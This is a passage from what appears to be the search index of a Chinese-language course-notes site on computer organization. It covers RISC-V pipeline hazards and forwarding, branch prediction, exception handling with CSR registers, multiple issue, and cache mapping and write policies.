ID/EX.RegisterRs2)] // \u6ca1\u53d1\u751f EX Hazard\n  and (MEM/WB.RegisterRd == ID/EX.RegisterRs2))\n  ForwardB = 01;\n</code></pre> <p>\u5bf9\u4e8e\u4e0d\u540c\u7684\u63a7\u5236\u4fe1\u53f7 <code>Forward(A/B)</code> \uff0cALU \u7684\u64cd\u4f5c\u6570\u9009\u62e9\u5982\u4e0b\u8868\uff1a</p> Mux Control Source Explanation Forward = 00 ID/EX This ALU operand comes from the register file Forward = 10 EX/MEM This ALU operand comes from the prior ALU result Forward = 01 MEM/WB This ALU operand comes from data memory or an earlier ALU result <p>\u540c\u65f6\u5b58\u5728 EX Hazard \u548c MEM Hazard \u65f6\u53ea\u6267\u884c EX Hazard\uff08\u9009\u62e9 Most Recent \u7684\u5192\u9669\u5904\u7406\uff09\u3002\u4f8b\u5982\uff1a</p> <pre><code>add x1, x1, x2 ; Instruction 1\nadd x1, x1, x3 ; Instruction 2\nadd x1, x1, x4 ; Instruction 3\n</code></pre> <p>\u5176\u4e2d\uff0c\u6307\u4ee4 1,3 \u4e4b\u95f4\u53d1\u751f MEM Hazard\uff1b\u6307\u4ee4 2,3 \u4e4b\u95f4\u53d1\u751f EX Hazard\uff0c\u90a3\u4e48\u5904\u7406\u5668\u53ea\u9700\u8981\u5904\u7406 EX Hazard \u5373\u53ef\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u4e0a\u9762 MEM Hazard \u7684\u5224\u65ad\u6761\u4ef6\u8fd9\u4e48\u5199\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u7279\u6b8a\u7684 Load-Use Hazard \uff0c\u5b83\u7684\u5224\u65ad\u6807\u51c6\u4e3a\uff1a</p> <pre><code>ID/EX.MemRead and \n[(ID/EX.RegisterRd == IF/ID.RegisterRs1) or \n (ID/EX.RegisterRd == IF/ID.RegisterRs2)]\n</code></pre>"},{"location":"Courses/CO/Chapter4/#control-hazards","title":"Control Hazards","text":"<p>\u5bf9\u4e8e\u8df3\u8f6c\u6307\u4ee4\uff0c\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\u7a76\u7adf\u662f PC+4 \u8fd8\u662f PC+address \u8d77\u7801\u8981\u7b49\u5230 EX \u9636\u6bb5\u540e\uff0c\u9700\u8981\u63d2\u5165\u4e09\u4e2aBubble\ud83e\udd14</p> <p>\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u5728 <code>branch</code> \u6307\u4ee4\u7684ID\u9636\u6bb5\u5c31\u63d0\u524d\u5bf9\u4e24\u4e2a\u6e90\u5bc4\u5b58\u5668\u8fdb\u884c\u6bd4\u8f83\uff08\u9700\u8981\u786c\u4ef6\u652f\u6301\uff09\uff0c\u4ece\u800c\u53ea\u9700\u8981\u4e00\u4e2aBubble\u5c31\u53ef\u4ee5\u5b8c\u6210\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740\u7684\u9009\u62e9\u3002</p> <pre><code>36: sub x10, x4, x8\n40: beq x1, x3, 32 ; PC-relative branch\n   #Bubble         ; to 40 + 16*2 = 72\n44: and x1, x2, x5 ; \u4e0d\u6267\u884c\n48: orr x1, x2, x6 ; \u4e0d\u6267\u884c\n    ...            ; \u4e0d\u6267\u884c\n72: ld x4, 50(x7)\n</code></pre> <p>\u4f46\u662f\u5bf9\u4e8e\u66f4\u957f\u7684\u6d41\u6c34\u7ebf\u6765\u8bf4\uff0c\u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\u53ef\u80fd\u4e0d\u80fd\u5e73\u7a33\u8fd0\u884c\uff0c\u662f unacceptable \u7684\u3002</p> <p>\u66f4\u591a\u65f6\u5019\uff0c\u6211\u4eec\u4f7f\u7528\u9884\u6d4b\u6765\u89e3\u51b3\u63a7\u5236\u5192\u9669\uff1a</p> <ul> <li>Static Branch Prediction <ul> <li>\u4e3a\u7279\u5b9a\u6307\u4ee4\u8bbe\u7f6e\u9ed8\u8ba4\u9884\u6d4b\u547d\u4e2d</li> <li>\u4f8b\u5982\uff0c\u5bf9\u4e8e loop \u548c if-statement<ul> <li>\u5411\u56de\u8df3\u8f6c\u9ed8\u8ba4\u547d\u4e2d</li> <li>\u5411\u4e0b\u8df3\u8f6c\u9ed8\u8ba4\u4e0d\u547d\u4e2d</li> </ul> </li> </ul> </li> <li>Dynamic Branch Prediction<ul> <li>\u57fa\u4e8e\u8fd0\u884c\u5386\u53f2\u6765\u9884\u6d4b\u662f\u5426\u547d\u4e2d</li> </ul> </li> </ul> <p>\u5373\u4fbf\u9884\u6d4b\u6ca1\u6709\u547d\u4e2d\uff0c\u6700\u65e9\u7684\u6307\u4ee4\u4e5f\u624d\u8fdb\u884c\u4e09\u4e2a\u9636\u6bb5\u5230 EXE\uff0c\u5e76\u6ca1\u6709\u5bf9\u6574\u4f53\u72b6\u6001\u8fdb\u884c\u66f4\u65b0\uff08\u5199\u56de\u5bc4\u5b58\u5668\u6216\u5199\u5165\u5185\u5b58\u7b49\uff09\uff0c\u6062\u590d\u72b6\u6001\u662f\u8f83\u4e3a\u65b9\u4fbf\u7684\u3002</p> <p>2 bit Predictor</p> <p></p>"},{"location":"Courses/CO/Chapter4/#exception-interrupt","title":"Exception &amp; Interrupt","text":"<ul> <li>\u4e2d\u65ad\u6765\u81ea\u4e8e CPU \u5916\u90e8\u7684 I/O controller\uff0c\u901a\u5e38\u7528\u4e8e\u4fe1\u606f\u7684\u8f93\u5165\u4e0e\u8f93\u51fa<ul> <li>\u4e2d\u65ad\u5904\u7406\u8fd4\u56de\u540e\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u56e0\u4e3a\u5728\u6267\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u524d\uff0c\u7cfb\u7edf\u4f1a\u4fdd\u8bc1\u5f53\u524d\u6307\u4ee4\u6267\u884c\u5b8c\u6bd5</li> </ul> </li> <li>\u5f02\u5e38\u6765\u81ea\u4e8e CPU \u5185\u90e8\u7684\u610f\u5916\u63a7\u5236\u6d41\uff0c\u662f\u4e0eCPU\u5f53\u524d\u6267\u884c\u6307\u4ee4\u76f8\u5173\u7684\u540c\u6b65\u4e8b\u4ef6<ul> <li>\u5f02\u5e38\u5904\u7406\u8fd4\u56de\u540e\u4f1a\u5c1d\u8bd5\u91cd\u65b0\u6267\u884c\u53d1\u751f\u5f02\u5e38\u7684\u6307\u4ee4</li> </ul> </li> </ul> <p>\u533a\u5206\u4e2d\u65ad\u548c\u5f02\u5e38</p> <p>\u4e00\u79cd\u89d2\u5ea6\uff1a\u5f02\u5e38\u4e00\u822c\u662f\u540c\u6b65\u7684\uff0c\u800c\u4e2d\u65ad\u4e00\u822c\u662f\u5f02\u6b65\u7684</p> <p>\u53e6\u4e00\u79cd\u89d2\u5ea6\uff1a\u5f02\u5e38\u662f\u7531\u7a0b\u5e8f\u5f15\u8d77\u7684\uff0c\u800c\u4e2d\u65ad\u4e00\u822c\u662f\u7531\u5916\u90e8\u8bbe\u5907\u5f15\u8d77\u7684</p> <p>\u5728\u8ba1\u7ec4\u5b9e\u9a8c\u4e2d\uff0c\u5f02\u5e38\u4ee5\u975e\u6cd5\u6307\u4ee4\u3001<code>ecall</code> \u7b49\u5f62\u5f0f\u51fa\u73b0\uff0c\u800c\u4e2d\u65ad\u4ee5\u5916\u8bbe\u4e2d\u65ad\u7b49\u5f62\u5f0f\u51fa\u73b0\u3002</p> <p>CPU \u9047\u5230\u5f02\u5e38\u65f6\uff0c\u9700\u8981\u8fdb\u884c\u5f02\u5e38\u5904\u7406\uff0c\u673a\u5668\u6a21\u5f0f\u4e0b\u7684\u4e00\u822c\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ul> <li>Save the Context: \u4fdd\u5b58\u5f53\u524d CPU \u72b6\u6001\u3002\u5305\u62ecPC\uff0c\u5bc4\u5b58\u5668\u7b49<ul> <li>\u5c06\u5f53\u524d PC \u4fdd\u5b58\u5230 <code>mepc</code></li> <li>\u5c06\u53d1\u751f\u5f02\u5e38\u7684\u5730\u5740\u4fdd\u5b58\u5230 <code>mtval</code></li> <li>\u5c06\u4e2d\u65ad/\u5f02\u5e38\u539f\u56e0\u5199\u5165 <code>mcause</code></li> <li>\u8fdb\u5165\u673a\u5668\u6a21\u5f0f</li> </ul> </li> <li>Trap Handler: \u8df3\u8f6c\u5230\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002\u8fd9\u4e2a\u7a0b\u5e8f\u4e00\u822c\u662f\u9884\u5148\u5b9a\u4e49\u597d\u7684\uff0c\u5176 PC \u5730\u5740\u653e\u5728 <code>mtvec</code> \u5bc4\u5b58\u5668\u4e2d<ul> <li>\u540c\u65f6\u66f4\u65b0\u673a\u5668\u6a21\u5f0f\u5f02\u5e38\u539f\u56e0\u5bc4\u5b58\u5668 <code>mcause</code>\uff0c\u66f4\u65b0\u673a\u5668\u6a21\u5f0f\u5f02\u5e38PC\u5bc4\u5b58\u5668 <code>mepc</code>\uff0c\u66f4\u65b0\u673a\u5668\u6a21\u5f0f\u5f02\u5e38\u503c\u5bc4\u5b58\u5668 <code>mtval</code>\uff0c\u66f4\u65b0\u673a\u5668\u6a21\u5f0f\u72b6\u6001\u5bc4\u5b58\u5668 <code>mstatus</code></li> </ul> </li> <li>Return: \u5904\u7406\u5b8c\u5f02\u5e38\u540e\uff0c\u6062\u590d CPU \u72b6\u6001\uff0c\u7ee7\u7eed\u6267\u884c</li> </ul> <p>\u6709\u4e00\u4e9b\u7cfb\u7edf\u7ea7\u522b\u7684\u63a7\u5236\u6307\u4ee4\uff0c\u5176 <code>opcode</code> \u5747\u4e3a <code>1110011</code>\u3002\u8fd9\u4e9b\u6307\u4ee4\u5305\u62ec\uff1a</p> <ul> <li><code>CSR</code> \u6307\u4ee4</li> <li><code>ecall</code> \u548c <code>ebreak</code> \uff0c\u7528\u4e8e\u5f02\u5e38\u5904\u7406</li> <li><code>mret</code> \u548c <code>sret</code> \uff0c\u7528\u4e8e\u4ece\u5f02\u5e38\u5904\u7406\u4e2d\u8fd4\u56de</li> </ul> CSR \u5bc4\u5b58\u5668 <p>CSR \u5bc4\u5b58\u5668\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u4fdd\u5b58 CPU \u7684\u72b6\u6001\u3002\u5176\u53ea\u80fd\u5728\u67d0\u4e9b\u7279\u6743\u7ea7\u522b\u4e0b/\u7528 CSR \u6307\u4ee4\u624d\u80fd\u8bbf\u95ee\u3002\u5176\u5171\u6709 12 \u4f4d\u5730\u5740\u7a7a\u95f4\uff0c\u6700\u9ad8\u4e24\u4f4d\u8868\u793a\u8bfb\u5199\u6743\u9650\uff0c\u6b21\u9ad8\u4e24\u4f4d\u8868\u793a\u7279\u6743\u6a21\u5f0f\u7684\u4f7f\u7528\u6743\u9650\uff1a </p> <p><code>mtvec</code> \u5bc4\u5b58\u5668\u683c\u5f0f\uff1a</p> <pre><code>31                     1    0\n+----------------------+----+\n|         BASE         |MODE|\n+----------------------+----+\n</code></pre> <ul> <li><code>MODE=0</code>\uff0c\u5f02\u5e38\u54cd\u5e94\u65f6\uff0c\u8df3\u8f6c\u5230 <code>BASE</code></li> <li><code>MODE=1</code>\uff0c\u5f02\u5e38\u54cd\u5e94\u65f6\uff0c\u8df3\u8f6c\u5230 <code>BASE</code></li> <li><code>MODE=1</code>\uff0c\u4e2d\u65ad\u54cd\u5e94\u65f6\uff0c\u8df3\u8f6c\u5230 <code>BASE+4*Cause</code><ul> <li>\u5176\u4e2d <code>CASUE</code> \u4e3a\u4e2d\u65ad\u5bf9\u5e94\u7684\u5f02\u5e38\u7f16\u53f7</li> </ul> </li> </ul>"},{"location":"Courses/CO/Chapter4/#instruction-level-parallelism","title":"Instruction-Level Parallelism","text":"<p>\u8be6\u60c5\u8bf7\u53bb\u770b\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u76f8\u5173\u90e8\u5206</p>"},{"location":"Courses/CO/Chapter4/#static-multiple-issue","title":"Static Multiple Issue","text":"<p>\u9759\u6001\u591a\u53d1\u5c04\uff0c\u7531\u7f16\u8bd1\u5668\u5b8c\u6210\u53d1\u5c04\u76f8\u5173\u5224\u65ad\u3002\u7f16\u8bd1\u5668\u4f1a\u5c06\u540c\u65f6\u6267\u884c\u4e0d\u4f1a\u51b2\u7a81\u7684\u6307\u4ee4\u5206\u6210\u4e0d\u540c issue packets\uff0c\u4e00\u8d77\u53d1\u5c04\uff0c\u4ece\u800c\u589e\u52a0\u6d41\u6c34\u7ebf\u7684\u6548\u7387\u3002</p> <p>Speculation \u731c\u6d4b</p> <p>\u4e0d\u7ba1\u662f\u9759\u6001\u591a\u53d1\u5c04\u8fd8\u662f\u52a8\u6001\u591a\u53d1\u5c04\uff0c\u7f16\u8bd1\u5668\u6216\u5904\u7406\u5668\u90fd\u4f1a\u201c\u731c\u6d4b\u6307\u4ee4\u201d\u7684\u884c\u4e3a\uff0c\u4ee5\u5c3d\u65e9\u6d88\u9664\u6389\u8be5\u6307\u4ee4\u4e0e\u5176\u5b83\u6307\u4ee4\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u3002</p> <p>\u5728\u7ecf\u5178\u53cc\u53d1\u5c04\u4f8b\u5b50\u4e2d\uff0cALU/Branch \u7c7b\u578b\u6307\u4ee4\u53ef\u4ee5\u548c Load/Store \u540c\u65f6\u6267\u884c\uff1a</p> <p></p> <p>Example 1</p> <p> \u8be5\u4f8b\u4e2d\u7f16\u8bd1\u5668\u5bf9\u6307\u4ee4\u987a\u5e8f\u8fdb\u884c\u4e86\u91cd\u6392\uff0c\u4ece\u800c\u63d0\u9ad8\u4e86Instruction Per Cycle\u3002\u4f46\u662f\u5e76\u975e\u65e0\u9650\u5236\u6253\u5305\uff0c\u540c\u4e00\u4e2a\u5305\u5185\u6307\u4ee4\u6570\u636e\u4e0d\u80fd\u6709\u4f9d\u8d56\u5173\u7cfb\u3002</p> <p>Example 2</p> <p> \u914d\u5408\u5faa\u73af\u5c55\u5f00\uff0c\u51cf\u5c11\u6570\u636e\u7ade\u4e89\uff0c\u5f97\u5230IPC=1.75\uff0c\u5df2\u7ecf\u5f88\u63a5\u8fd1\u7406\u60f3\u6570\u503c 2 \u4e86\u3002</p>"},{"location":"Courses/CO/Chapter4/#dynamic-multiple-issue","title":"Dynamic Multiple Issue","text":"<p>\u52a8\u6001\u591a\u53d1\u5c04\u5728\u52a8\u6001\u6267\u884c\u8fc7\u7a0b\u4e2d\u7531\u786c\u4ef6\u5b8c\u6210\u53d1\u5c04\u76f8\u5173\u5224\u65ad\uff0c\u5141\u8bb8CPU\u4e71\u5e8f\u6267\u884c\u6307\u4ee4\u3002</p> <pre><code>ld x31, 20(x21)\nadd x1, x31, x2\nsub x23, x23, x3\nandi x5, x23, 20\n</code></pre> <p>\u5f53 <code>add</code> \u5728\u7b49\u5f85 <code>x31</code> \u6570\u636e\u65f6\uff0cCPU\u53ef\u4ee5\u5148\u6267\u884c <code>sub</code> \u7684\u524d\u51e0\u4e2a\u9636\u6bb5\u3002</p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u53ea\u7528\u7f16\u8bd1\u5668\u4f18\u5316\u7684\u9759\u6001\u591a\u53d1\u5c04\u5462\uff1f</p> <ul> <li>&lt;1&gt; \u4e0d\u662f\u6240\u6709\u7684 stalls \u662f\u53ef\u9884\u6d4b\u7684<ul> <li>e.g., cache misses</li> </ul> </li> <li>&lt;2&gt; \u8df3\u8f6c\u6307\u4ee4\u7684\u7ed3\u679c\u662f\u52a8\u6001\u51b3\u5b9a\u7684</li> <li>&lt;3&gt; \u5bf9\u4e8e\u4e00\u4e2a ISA\uff0c\u5176\u4e0d\u540c\u6267\u884c\u65b9\u6cd5\u6709\u7740\u4e0d\u540c\u7684 Latency \u548c Hazard</li> </ul>"},{"location":"Courses/CO/Chapter5/","title":"CH 5. \u5b58\u50a8\u5668\u5206\u7ea7\u4f53\u7cfb","text":""},{"location":"Courses/CO/Chapter5/#chapter-5-memory-hierarchy","title":"Chapter 5. Memory Hierarchy","text":"<p> \u7ea6 2989 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p>"},{"location":"Courses/CO/Chapter5/#memory-hierarchy-overview","title":"Memory Hierarchy Overview","text":"<p>\u5b58\u50a8\u5bb9\u91cf\u548c\u8bfb\u5199\u901f\u5ea6\u4e0d\u53ef\u517c\u5f97\u3002</p> <p>Cache\u7684\u51fa\u73b0\u89e3\u51b3\u4e86\u4e3b\u5b58\u901f\u5ea6\u4e0d\u591f\u5feb\u7684\u95ee\u9898\uff0c\u4e5f\u662f\u8fd9\u95e8\u8bfe\u7a0b\u8ba8\u8bba\u7684\u91cd\u70b9\u3002</p> <p>Memory Hierarchy</p> <p></p> <ul> <li>Hit The CPU accesses the upper level and succeeds</li> <li>Miss The CPU accesses the upper level and fails</li> <li>Hit time \u8bbf\u95ee\u4e0a\u5c42\u5b58\u50a8\u7684\u65f6\u95f4\uff0c\u5305\u62ec\u51b3\u5b9a\u8be5\u6b21\u8bbf\u95ee\u662f\u5426\u547d\u4e2d\u6240\u9700\u7684\u65f6\u95f4</li> <li>Miss penalty \u5c06\u4e0a\u5c42\u5b58\u50a8\u7684 Block \u66ff\u6362\u4e3a\u4e0b\u5c42 Block \u6240\u9700\u7684\u65f6\u95f4\uff0c\u5305\u62ec\u5c06\u8fd9\u4e2a Block \u4f20\u9012\u7ed9\u5904\u7406\u5668\u6240\u9700\u7684\u65f6\u95f4</li> </ul>"},{"location":"Courses/CO/Chapter5/#cache","title":"Cache","text":"<p>\u5c40\u90e8\u6027\u539f\u7406: \u8ba1\u7b97\u673a\u7a0b\u5e8f\u5728\u65f6\u95f4\u4e0e\u7a7a\u95f4\u4e0a\u90fd\u8868\u73b0\u51fa\u5c40\u90e8\u6027</p> <ul> <li>\u65f6\u95f4\u5c40\u90e8\u6027 (Temporal Locality)<ul> <li>\u6700\u8fd1\u88ab\u8bbf\u95ee\u7684\u5b58\u50a8\u5668\u5355\u5143\u5f88\u5feb\u8fd8\u4f1a\u88ab\u8bbf\u95ee</li> <li>\u4fdd\u5b58\u8fd1\u671f\u9891\u7e41\u88ab\u8bbf\u95ee\u7684\u4e3b\u5b58\u5355\u5143\u7684\u6570\u636e</li> </ul> </li> <li>\u7a7a\u95f4\u5c40\u90e8\u6027 (Spatial Locality)<ul> <li>\u6b63\u5728\u88ab\u8bbf\u95ee\u7684\u5b58\u50a8\u5668\u5355\u5143\u9644\u8fd1\u5f88\u5feb\u4f1a\u88ab\u8bbf\u95ee</li> <li>\u4ece\u4e3b\u5b58\u4e2d\u53d6\u56de\u5f85\u8bbf\u95ee\u6570\u636e\u65f6\uff0c\u4f1a\u540c\u65f6\u53d6\u56de\u4e0e\u5176\u4f4d\u7f6e\u76f8\u90bb\u7684\u4e3b\u5b58\u5355\u5143\u7684\u6570\u636e</li> </ul> </li> </ul> <ul> <li>Block \u5757\uff1acache \u548c\u4e3b\u5b58(\u4e0b\u5c42)\u4e4b\u95f4\u4fe1\u606f\u4ea4\u4e92\u7684\u5355\u5143</li> <li>Word \u5b57\uff1acache \u548c CPU(\u4e0a\u5c42)\u4e4b\u95f4\u4fe1\u606f\u4ea4\u4e92\u7684\u5355\u5143</li> <li>hit \u547d\u4e2d\uff1a\u5904\u7406\u5668\u6240\u9700\u6570\u636e\u5728\u672c\u5c42\u5b58\u50a8\u4e2d\u627e\u5230</li> <li>miss \u5931\u6548\uff1a\u5904\u7406\u5668\u6240\u9700\u6570\u636e\u672a\u80fd\u5728\u672c\u5c42\u5b58\u50a8\u4e2d\u627e\u5230</li> <li>\u547d\u4e2d\u7387 \uff1a\u5728\u8bbf\u95ee\u672c\u5c42\u5b58\u50a8\u65f6\u547d\u4e2d\u7684\u6b21\u6570\u5360\u603b\u6b21\u6570\u7684\u6bd4\u4f8b\uff0c\u901a\u5e38\u4f5c\u4e3a\u5c42\u6b21\u7ed3\u6784\u7684\u6027\u80fd\u8861\u91cf\u6307\u6807\u4e4b\u4e00</li> <li>\u5931\u6548\u7387 \uff1a\u5728\u8bbf\u95ee\u672c\u5c42\u5b58\u50a8\u65f6\u5931\u6548\u7684\u6b21\u6570\u5360\u603b\u6b21\u6570\u7684\u6bd4\u4f8b\u3002\u547d\u4e2d\u7387\u4e0e\u5931\u6548\u7387\u76f8\u52a0\u4e3a1</li> </ul>"},{"location":"Courses/CO/Chapter5/#directed-mapping","title":"Directed Mapping","text":"<p>\u5e38\u89c1\u6709\u4e09\u79cd\u6620\u5c04\u65b9\u5f0f\uff1a</p> <ul> <li>\u76f4\u63a5\u6620\u5c04 Direct Mapping</li> <li>\u7ec4\u76f8\u8054 Set associated</li> <li>\u5168\u76f8\u8054 Fully associated</li> </ul> <p>A Simple Example</p> <p>\u5bf9\u4e8e 32bit \u4e3b\u5b58\u5730\u5740\u30014-Block Cache\u30011-word Block\uff0c\u5219\u4e00\u5171\u9700\u8981 2bit \u4f5c\u4e3a\u7d22\u5f15index\uff0c2 bit \u7528\u4f5c Offset\uff0c\u5269\u4f59 28bit \u7528\u4f5c TAG\u3002\u5728\u6211\u4eec\u4e4b\u524d\u5df2\u8bbf\u95ee\u8fc7\u4e3b\u5b58 <code>0x04</code> \u7684\u60c5\u51b5\u4e0b\uff0c\u6267\u884c <code>load r1, 0x04</code> \uff1a</p> <p></p> <pre><code>Cache \u5730\u5740\u6620\u5c04\uff1a\n+-------+--------+-------+\n|\u6807\u7b7eTAG|\u7d22\u5f15INDEX|\u5757\u504f\u79fb\u91cf|\n+-------+--------+-------+\n\nCache \u7ed3\u6784\uff1a\n+----------------+----------+-------+-------+\n|    \u6807\u7b7eTAG      | \u6570\u636eDATA | Valid | Dirty |\n+----------------+----------+-------+-------+\n 64-(n+m+2) bit   2^m*32 bit   1bit   (1bit)\n\n- Valid(1 bit) \u8868\u793a Cache \u4e2d\u6570\u636e\u662f\u5426\u6709\u6548\n- Dirty(1 bit) \u8868\u793a Cache \u4e2d\u6570\u636e\u662f\u5426\u662f\u6700\u65b0\u4e14\u8fd8\u6ca1\u5199\u56de\u4e3b\u5b58\n</code></pre> <p>\u4f8b\u5982\uff0c\u4e3b\u5b58\u4e3a 64-bit \u5730\u5740\uff0cCache \u542b\u6709 \\(2^n\\) \u4e2a Block\uff0c\u6bcf\u4e2a Block \u542b\u6709 \\(2^m\\) \u4e2a word\uff1a</p> <ul> <li>Byte Offset m+2 bit<ul> <li>\u4ee5 byte \u4e3a\u5355\u4f4d\u7684\u504f\u79fb\u91cf\uff0c\u5373 \\(\\log _2 (2^m\\cdot 4)\\) (1 word = 4 byte = 32 bit)</li> </ul> </li> <li>Cache index n bit</li> <li>Tag field 64-(n+m+2) bit</li> </ul> <p>\u90a3\u4e48\u8be5 Cache \u7684\u5927\u5c0f\u4e3a\uff1a</p> \\[ 2^n\\times (2^m \\times 32 +(64-n-m-2)+1) \\] <p>\u8fd9\u91cc\u6700\u540e\u7684 1 \u662f Valid \u4f4d\u3002\u6709\u65f6\u5019\u8fd8\u9700\u8981\u52a0\u4e0a Dirty \u4f4d</p> <p></p> \u6c42 Cache \u5927\u5c0f\u7ed9\u51fa Byte Address\uff0c\u6c42 Block Number <p></p> <p></p> <p>\u5199\u9898\u65f6\u51fa\u73b0\u7684Block Size\u5747\u6307Data\u6bb5\u5927\u5c0f\uff0c\u5982 two-word block \u6307 64 bits data</p> <p>\u5bf9\u4e8e\u76f4\u63a5\u6620\u5c04 Cache\uff0cTag \u5bbd\u5ea6\u7b49\u4e8e\u7269\u7406\u5730\u5740\u5bbd\u5ea6\u76f4\u63a5\u51cf\u53bb Cache \u5bb9\u91cf\u4f4d\u6570</p>"},{"location":"Courses/CO/Chapter5/#cache-hit-miss","title":"Cache Hit &amp; Miss","text":"<p>\u663e\u7136\uff0c\u8bfb\u548c\u5199\u7684\u65f6\u5019\u53d1\u751f cache miss \u7684\u5904\u7406\u65b9\u5f0f\u662f\u4e0d\u4e00\u6837\u7684\uff1b\u53e6\u5916\u8bfb\u4e5f\u6709\u8bfb\u6570\u636e\u548c\u8bfb\u6307\u4ee4\u4e4b\u5206\uff08\u6307\u4ee4 cache \u548c\u6570\u636e cache \u901a\u5e38\u662f\u5206\u79bb\u7684\uff09\u3002\u6211\u4eec\u5206\u522b\u5bf9\u5176\u8fdb\u884c\u8ba8\u8bba\uff1a</p> ReadWrite <ul> <li>Hit<ul> <li>\u76f4\u63a5\u4ece cache \u91cc\u8bfb\u5c31\u597d\u4e86</li> </ul> </li> <li>Miss<ul> <li>Data cache miss<ul> <li>\u4ece memory \u91cc\u628a\u5bf9\u5e94\u7684 block \u62ff\u5230 cache\uff0c\u7136\u540e\u8bfb\u53d6\u5bf9\u5e94\u7684\u5185\u5bb9\u3002</li> </ul> </li> <li>Instruction cache miss<ul> <li>\u6682\u505c CPU \u8fd0\u884c\uff0c\u4ece memory \u91cc\u628a\u5bf9\u5e94\u7684 block \u62ff\u5230 cache\uff0c\u4ece\u7b2c\u4e00\u4e2a step \u5f00\u59cb\u91cd\u65b0\u8fd0\u884c\u5f53\u524d\u8fd9\u6761\u6307\u4ee4\u3002</li> </ul> </li> </ul> </li> </ul> <ul> <li>Hit\u00a0\u6709\u4e24\u79cd\u53ef\u4ee5\u9009\u7684\u65b9\u5f0f\uff1a<ul> <li>write-through\uff0c\u5373\u6bcf\u6b21\u5199\u6570\u636e\u65f6\uff0c\u540c\u65f6\u66f4\u65b0 Cache \u548c\u4e3b\u5b58\u3002\u8fd9\u6837\u7684\u597d\u5904\u662f cache \u548c main memory \u603b\u662f\u4e00\u81f4\u7684\uff0c\u4f46\u662f\u8fd9\u6837\u76f8\u5f53\u4e8e\u76f4\u63a5\u5199\u4e3b\u5b58\uff0c\u901f\u5ea6\u5f88\u6162\u3002<ul> <li>\u4e00\u4e2a\u6539\u8fdb\u662f\u5f15\u5165\u4e00\u4e2a\u00a0write buffer\uff0c\u5373\u5f53\u9700\u8981\u5199 main memory \u7684\u65f6\u5019\u4e0d\u662f\u7acb\u5373\u53bb\u5199\uff0c\u800c\u662f\u5148\u5199\u5165 Buffer \u4e2d\uff0c\u627e\u673a\u4f1a\u518d\u5199\u8fdb\u4e3b\u5b58\uff1b\u6b64\u65f6 CPU \u5c31\u53ef\u4ee5\u7ee7\u7eed\u8fd0\u884c\u4e86\u3002\u5f53\u7136\uff0c\u5f53 write buffer \u6ee1\u4e86\u7684\u65f6\u5019\uff0c\u4e5f\u9700\u8981\u6682\u505c\u5904\u7406\u5668\u6765\u505a\u5199\u5165 main memory \u7684\u5de5\u4f5c\uff0c\u76f4\u5230 buffer \u4e2d\u6709\u7a7a\u95f2\u7684 entry\u3002\u56e0\u6b64\uff0c\u5982\u679c main memory \u7684\u5199\u5165\u901f\u7387\u4f4e\u4e8e CPU \u4ea7\u751f\u5199\u64cd\u4f5c\u7684\u901f\u7387\uff0c\u591a\u5927\u7684\u7f13\u51b2\u90fd\u65e0\u6d4e\u4e8e\u4e8b\u3002</li> </ul> </li> <li>write-back\uff0c\u53ea\u5c06\u4fee\u6539\u7684\u5185\u5bb9\u5199\u5728 cache \u91cc\uff0c\u7b49\u5230\u8fd9\u4e2a block \u8981\u88ab\u8986\u76d6\u6389\u7684\u65f6\u5019\u5c06\u5176\u5199\u56de\u5185\u5b58\u3002\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u00a0dirty bit\u00a0\u6765\u8bb0\u5f55\u8fd9\u4e2a cache block \u662f\u5426\u88ab\u66f4\u6539\u8fc7\uff0c\u4ece\u800c\u77e5\u9053\u88ab\u8986\u76d6\u524d\u662f\u5426\u9700\u8981\u88ab\u5199\u56de\u5185\u5b58\u3002\u7531\u4e8e\u5bf9\u540c\u4e00\u4e2a block \u901a\u5e38\u4f1a\u6709\u591a\u6b21\u5199\u5165\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u6d88\u8017\u7684\u603b\u5e26\u5bbd\u662f\u66f4\u5c0f\u7684\u3002</li> </ul> </li> <li>Miss\u00a0\u540c\u6837\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a<ul> <li>write allocate\uff0c\u5373\u50cf read miss \u4e00\u6837\u5148\u628a block \u62ff\u5230 cache \u91cc\u518d\u5199\u5165\u3002</li> <li>write around\u00a0(or\u00a0no write allocate)\uff0c\u8003\u8651\u5230\u65e2\u7136\u672c\u6765\u5c31\u8981\u53bb\u4e00\u6b21 main memory\uff0c\u4e0d\u5982\u76f4\u63a5\u5728\u91cc\u9762\u5199\u4e86\uff0c\u5c31\u4e0d\u518d\u62ff\u5230 cache \u91cc\u4e86\u3002</li> </ul> </li> </ul> <p>Write Back \u642d\u914d Write Allocate\uff0cWrite Through \u642d\u914d Write Around</p> <p>Quote</p> <p></p> <p><code>Sace dirty block first</code> \u6307\u7684\u662f\uff0c\u5982\u679c\u8981\u8bfb/\u5199\u7684Block\u7684dirty\u4f4d\u4e3a1\uff0c\u5219\u8fd9\u4e2aBlock\u8fd8\u672a\u5728\u4e3b\u5b58\u4e2d\u66f4\u65b0\u3002\u6240\u4ee5\u8981\u5148 Write Memory \u66f4\u65b0\u4e3b\u5b58\uff0c\u5728\u7ee7\u7eed\u540e\u9762\u7684\u64cd\u4f5c\u3002</p> 